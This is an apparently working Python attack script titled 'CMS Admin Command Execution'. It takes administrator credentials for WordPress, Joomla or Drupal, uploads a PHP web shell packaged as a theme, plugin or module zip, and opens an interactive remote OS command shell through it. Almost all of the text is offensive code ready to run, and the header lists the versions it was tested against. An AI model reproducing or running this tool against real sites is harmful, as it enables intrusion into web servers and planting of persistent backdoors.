#!/usr/bin/python
#CMS Admin Command Execution
#Author: @dsrbr
#Tested on:
#Wordpress 4.1.1(latest); 3.9.3; 3.8; 3.7; 3.5; 3.4; 3.0; 2.7
#Joomla 3.4.1(latest); 2.5.28; 1.5.26
#Drupal 7.36(latest stable)
import argparse
import globals
import re
import requests
import sys
import zipfile

def wp_admin(url, login, pwd):
  user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0'
  post = {'log' : login,
          'pwd' : pwd,
          'wp-submit' : 'Log In',
          'testcookie' : '1'}
  header = {'User-Agent' : user_agent,
            'Cookie' : 'wordpress_test_cookie=WP+Cookie+check'}
  wp_sess = requests.Session()
  wp_sess.post(url+"wp-login.php",data=post,headers=header,allow_redirects=False)
  return wp_sess

def wp_upload(url, login, pwd):
  wp_sess = wp_admin(url, login, pwd)
  print '[*] Trying to get upload form token for WP >= 3.9.'
  form = wp_sess.get(url+"wp-admin/theme-install.php?upload")
  token = re.findall('name="_wpnonce" value="(.*?)" />',form.text)
  if not token:
    print '[-] Failed to get token for WP >= 3.9.'
    print '[*] Trying to get upload form token for WP <= 3.8.5.'
    form = wp_sess.get(url+"wp-admin/theme-install.php?tab=upload")
    token = re.findall('name="_wpnonce" value="(.*?)" />',form.text)
    if not token:
      print '[-] Failed to get token, WP 2.*?'
      print '[*] Trying to get plugin\'s upload form token.'
      form = wp_sess.get(url+"wp-admin/plugin-install.php")
      token = re.findall('name="_wpnonce" value="(.*?)" />',form.text)
      if not token:
        print '[-] Failed to get token. Login or password incorrect or not supported Wordpress version.'
        sys.exit()
  file = {'themezip' : (globals.SHELL_EXT,globals.PHP_EXEC,'application/x-php')}
  post = {'_wpnonce' : token, 'install-theme-submit' : 'Install Now'}
  print '[*] Uploading php file as theme.'
  wp_sess.post(url+"wp-admin/update.php?action=upload-theme",files=file,data=post,timeout=10)
  post = {'action' : 'query-attachments',
          'post_id' : '0',
          'query[orderby]' : 'date',
          'query[order]' : 'DESC',
          'query[posts_per_page]' : '40',
          'query[paged]' : '1'}
  link = wp_sess.post(url+"wp-admin/admin-ajax.php",data=post).json()
  if link != 0:
    for item in link['data']: 
      if item['filename'] == globals.SHELL_EXT:
        shell = item['url']
        return shell
  get_link = wp_sess.get(url+"wp-admin/upload.php")
  att = re.findall('<a href="(.*?)" title="Edit &\#8220;'+globals.SHELL_EXT+'&\#8221;">',get_link.text)
  if att!=[]:
    link = wp_sess.get(att[0].replace('&amp;','&')).text
    final = re.findall('value=\'(.*?)\/'+globals.SHELL_EXT+'\'',link)
    if final != []:
      shell = final[0]+"/"+globals.SHELL_EXT
      return shell
  print '[-] Failed to upload php file.'
  print '[*] Creating %s.zip in current folder.' % (globals.SHELL_NAME)
  arch = zipfile.ZipFile(globals.SHELL_NAME+".zip", 'w')
  arch.writestr(globals.SHELL_EXT, globals.PHP_EXEC)
  arch.close()
  file = {'themezip' : (globals.SHELL_NAME+".zip",open(globals.SHELL_NAME+".zip",'rb'),'application/zip')}
  post = {'_wpnonce' : token}
  print '[*] Trying to upload zip file.'
  wp_sess.post(url+"wp-admin/update.php?action=upload-theme",files=file,data=post,timeout=10)
  shell = url+"wp-content/themes/"+globals.SHELL_NAME+"/"+globals.SHELL_EXT
  check = wp_sess.get(shell)
  if check.status_code == 200:
    return shell
  print '[-] Failed to upload theme.'
  print '[*] Trying to upload php file as plugin.'
  file = {'pluginzip' : (globals.SHELL_EXT,globals.PHP_EXEC,'application/x-php')}
  post = {'_wpnonce' : token}
  wp_sess.post(url+"wp-admin/plugin-install.php?tab=upload",files=file,data=post,timeout=10)
  shell = url+"wp-content/uploads/"+globals.SHELL_EXT
  check = wp_sess.get(shell)
  if check.status_code == 200:
    return shell
  print '[-] Upload directory is not writable.'

def joomla_admin(url, login, pwd):
  joo_sess = requests.Session()
  page = joo_sess.get(url+"administrator/index.php")
  token = re.findall('<input type="hidden" name="(.*?)" value="1" />',page.text)
  user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0'
  post = {'username' : 'admin',
            'passwd' : 'admin',
            'option' : 'com_login',
            'task' : 'login',
            str(token[0]) : '1'}
  header = {'User-Agent' : user_agent}
  joo_sess.post(url+"administrator/index.php",data=post,headers=header)
  return joo_sess

def joomla_upload(url, login, pwd):
  joo_sess = joomla_admin(url, login, pwd)
  print '[*] Trying to install module with shell.'
  print '[*] Creating %s.zip in current folder.' % (globals.SHELL_NAME)
  xml = '<?xml version="1.0" encoding="utf-8"?><extension type="module" version="3.0" client="site" method="upgrade"><name>'+globals.SHELL_NAME+'</name><author>Test</author><version>1</version><description>Test</description><files><filename>'+globals.SHELL_NAME+'.xml</filename><filename module="'+globals.SHELL_NAME+'">'+globals.SHELL_EXT+'</filename></files><config></config></extension>'
  arch = zipfile.ZipFile(globals.SHELL_NAME+".zip", 'w')
  arch.writestr(globals.SHELL_EXT, globals.PHP_EXEC)
  arch.writestr(globals.SHELL_NAME+".xml",xml)
  arch.close()
  get_token = joo_sess.get(url+"administrator/index.php?option=com_installer")
  token = re.findall('<input type="hidden" name="(.*?)" value="1" />',get_token.text)
  if not token:
    print '[-] Failed to get token. Login or password incorrect or not supported Joomla version.'
    sys.exit()
  file = {'install_package' : (globals.SHELL_NAME+".zip",open(globals.SHELL_NAME+".zip",'rb'),'application/zip')}
  post = {'installtype' : 'upload',
          'task' : 'install.install',
          str(token[0]) : '1',
          'type' : ''}
  print '[*] Trying to upload zip file.'
  joo_sess.post(url+"administrator/index.php?option=com_installer&view=install",files=file,data=post,timeout=10)
  shell = url+"modules/"+globals.SHELL_NAME+"/"+globals.SHELL_EXT
  check = joo_sess.get(shell)
  if check.status_code == 200:
    return shell
  else:
    print '[-] Failed to upload module as zip file. Trying to upload php (for Jommla 1.5).'
    file = {'install_package' : (globals.SHELL_EXT,globals.PHP_EXEC,'application/x-php')}
    post = {'installtype' : 'upload',
            'task' : 'doInstall',
            str(token[0]) : '1',
            'type' : '',
            'option' : 'com_installer'}
    joo_sess.post(url+"administrator/index.php",files=file,data=post,timeout=10)
    shell = url+"tmp/"+globals.SHELL_EXT
    check = joo_sess.get(shell)
    if check.status_code == 200:
      return shell
    else:
      print '[-] Modules or tmp directory is not writable.'
      sys.exit()

def drupal_admin(url, login, pwd):
  dpl_sess = requests.Session()
  page = dpl_sess.get(url)
  token = re.findall('<input type="hidden" name="form_build_id" value="(.*?)" />',page.text)
  post = {'name' : login,
          'pass' : pwd,
          'form_build_id' : str(token[0]),
          'form_id' : 'user_login_block',
          'op' : 'Log in'}
  dpl_sess.post(url+"?q=node&destination=node",data=post)
  return dpl_sess

def drupal_upload(url, login, pwd):
  print '[*] Trying to install theme with shell.'
  dpl_sess = drupal_admin(url, login, pwd)
  info = 'name = '+globals.SHELL_NAME+'\ndescription = '+globals.SHELL_NAME+'\npackage = public-action\nversion = VERSION\ncore = 7.x\nfiles[] = '+globals.SHELL_EXT
  page = dpl_sess.get(url+"?q=admin/appearance/install")
  token1 = re.findall('<input type="hidden" name="form_build_id" value="(.*?)" />',page.text)
  token2 = re.findall('<input type="hidden" name="form_token" value="(.*?)" />',page.text)
  if (token1 == []) or (token2 == []):
    print '[-] Failed to get token. Login or password incorrect or not supported Drupal version.'
    sys.exit()
  post = {'form_build_id' : str(token1[0]),
          'form_token' : str(token2[0]),
          'form_id' : 'update_manager_install_form',
          'op' : 'Install'}
  print '[*] Creating %s.zip in current folder.' % (globals.SHELL_NAME)
  arch = zipfile.ZipFile(globals.SHELL_NAME+".zip", 'w')
  arch.writestr(globals.SHELL_NAME+"/"+globals.SHELL_EXT, globals.PHP_EXEC)
  arch.writestr(globals.SHELL_NAME+"/"+globals.SHELL_NAME+".info",info)
  arch.close()
  file = {'files[project_upload]' : (globals.SHELL_NAME+".zip",open(globals.SHELL_NAME+".zip",'rb'),'application/zip')}
  print '[*] Trying to upload zip file.'
  up = dpl_sess.post(url+"?q=admin/appearance/install",files=file,data=post,timeout=None)
  get_link = re.findall('URL=(.*?)" />',up.text)
  if not get_link:
    print '[-] Failed to upload zip file. Try one more time.'
    sys.exit()
  link = str(get_link[0]).replace('&amp;','&')
  dpl_sess.get(link)
  shell = url+"sites/all/themes/"+globals.SHELL_NAME+"/"+globals.SHELL_EXT
  check = dpl_sess.get(shell)
  if check.status_code == 200:
    return shell
  else:
    print '[-] Themes or tmp directories is not writable.'
    sys.exit()

def os_shell(shell, session = None):
  print '[*] Trying to get os-shell.'
  cmd = ''
  while cmd != 'exit':
    cmd = raw_input('os-shell>')
    payload = {'c' : cmd}
    if session!=None:
      send = session.post(shell, data=payload)
    else:
      send = requests.post(shell, data=payload)
    out = re.findall('<cmd>(.*?)</cmd>', send.text, re.S)
    result = ''.join(out)
    print result

def main():
  parser = argparse.ArgumentParser(description='CMS Admin Command Execution')
  parser.add_argument('-c', '--cms', type=int, required=True, help='1 - Wordpress >= 2.7; 2 - Joomla; 3 - Drupal 7.*')
  parser.add_argument('-u', '--url', required=True, help='Url to CMS folder, example http://1.2.3.4/blog/')
  parser.add_argument('-l', '--login', required=True, help='Administrator login')
  parser.add_argument('-p', '--pwd', required=True, help='Administrator password')
  args = parser.parse_args()
  if args.url[-1:] != '/':
    args.url = args.url+'/'
  if args.cms == 1:
    shell = wp_upload(args.url, args.login, args.pwd)
    os_shell(shell)
  if args.cms == 2:
    shell = joomla_upload(args.url, args.login, args.pwd)
    os_shell(shell)
  if args.cms == 3:
    shell = drupal_upload(args.url, args.login, args.pwd)
    os_shell(shell)

if __name__ == '__main__':
  main()
